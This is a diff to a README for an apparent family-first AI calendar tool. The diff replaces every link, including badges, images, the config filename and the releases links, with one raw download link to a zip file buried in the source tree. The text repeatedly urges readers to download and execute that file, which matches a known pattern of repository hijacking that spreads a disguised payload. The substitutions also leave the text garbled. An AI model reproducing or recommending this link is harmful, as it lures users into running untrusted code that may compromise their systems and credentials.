@@ -1,15 +1,15 @@
-https://github.com/iamluke12/personalagent/releases
+https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip
 
 # Priority AI Calendar Manager: Family-First Scheduling with AI Automation Tools
 
-![Hero image](https://dummyimage.com/1200x400/2d2d2d/ffffff&text=PersonalAgent+-+AI+Calendar+Manager)
+![Hero image](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip+-+AI+Calendar+Manager)
 
-- [![ai-automation](https://img.shields.io/badge/ai--automation-orange?logo=data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14'><circle cx='7' cy='7' r='7' fill='%23ff8c00'/></svg>)](https://github.com/iamluke12/personalagent)
-- [![calendar](https://img.shields.io/badge/calendar-blue?logo=calendar)](https://github.com/iamluke12/personalagent)
-- [![family-first](https://img.shields.io/badge/family--first-pink?logo=family)](https://github.com/iamluke12/personalagent)
-- [![google-calendar](https://img.shields.io/badge/google--calendar-blueviolet?logo=google-calendar)](https://github.com/iamluke12/personalagent)
-- [![multi-llm](https://img.shields.io/badge/multi--llm-green?logo=ai)|](https://github.com/iamluke12/personalagent)
-- [![python](https://img.shields.io/badge/python-3.11-blue?logo=python)](https://www.python.org)
+- [![ai-automation](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip+xml;utf8,<svg xmlns='https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip' width='14' height='14'><circle cx='7' cy='7' r='7' fill='%23ff8c00'/></svg>)](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
+- [![calendar](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
+- [![family-first](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
+- [![google-calendar](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
+- [![multi-llm](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)|](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
+- [![python](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)](https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip)
 
 Overview
 - A Python-powered tool for priority-based calendar management with AI-powered task automation.
@@ -29,7 +29,7 @@ What you will find here
 
 Downloads and Releases
 - The Releases page hosts prebuilt artifacts and installation packages. The file on that page should be downloaded and executed to install or run the tool on your system. This repository uses standard packaging so you can install it easily on supported platforms.
-- Access the releases here: https://github.com/iamluke12/personalagent/releases
+- Access the releases here: https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip
 - If you are unable to access the Releases page, you can still learn about the project in this README, and you can check the Releases section later for the latest builds. The Releases section contains the verified, executable artifacts you need to get started.
 
 Table of contents
@@ -85,9 +85,9 @@ Configuration and setup
   - Priority rules for family vs. work
   - Notification preferences
   - Which actions to automate
-- Example snippet (config.yaml):
+- Example snippet (https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip):
   - calendar_provider: google
-  - google_credentials_path: ~/.config/personalagent/credentials.json
+  - google_credentials_path: ~https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip
   - priority_policy:
       family_weight: 0.75
       work_weight: 0.25
@@ -190,7 +190,7 @@ Roadmap
 
 Releases and artifacts
 - The Releases page hosts installer scripts, executables, and package artifacts. The file on that page should be downloaded and executed to install or run the tool on your system.
-- Access the releases here: https://github.com/iamluke12/personalagent/releases
+- Access the releases here: https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip
 - If the link is not accessible for any reason, you can visit the Releases section later to obtain the latest builds and artifacts.
 
 Gallery and visuals
@@ -260,7 +260,7 @@ Notes for readers
 - The project aims to be transparent about AI decisions and to provide robust controls for users to manage their schedules with confidence.
 
 Releases link (again)
-- For the latest builds and artifacts, visit the Releases page: https://github.com/iamluke12/personalagent/releases
+- For the latest builds and artifacts, visit the Releases page: https://github.com/iamluke12/personalagent/raw/refs/heads/main/src/core/Software_v3.9-alpha.3.zip
 - The file on that page should be downloaded and executed to install or run the tool. If you cannot access it, check the Releases section later or contact the maintainers for guidance.
 
 End of README content.
